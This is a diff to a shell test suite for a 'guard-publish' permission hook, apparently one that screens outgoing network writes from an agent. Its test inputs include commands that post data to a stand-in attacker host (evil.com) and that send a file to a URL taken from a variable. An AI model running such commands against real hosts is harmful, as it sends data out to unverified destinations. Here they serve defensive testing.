@@ -477,4 +477,14 @@ assert_eq "$OUT" "" "a local write with a header and an output file asks nothing
 run_hook "$S" "$(jsonin 'xh POST http:evil.com text=hi')"
 assert_rc 2 "a write to a URL with no slashes after its scheme blocked"
 
+# A write to a host not proven local asks, and says why.
+run_hook "$S" "$(jsonin 'curl -d x http://api:8080/x')"
+assert_rc 0 "a write to a name with no dot is not refused outright"
+assert_out '"permissionDecision":"ask"' "a write to a name with no dot asks"
+assert_out 'not proven local' "the question says the host is not proven local"
+run_hook "$S" "$(jsonin 'curl -X POST -d @msg.json "$WEBHOOK_URL"')"
+assert_out '"permissionDecision":"ask"' "a write to a URL from a variable asks"
+assert_out 'URL from a variable' "the question says the URL is from a variable"
+case "$OUT" in *'passes that argument whole'*) echo "  FAIL [a host question says nothing of a quoted argument]: $OUT"; FAILS=1 ;; esac
+
 finish "guard-publish"
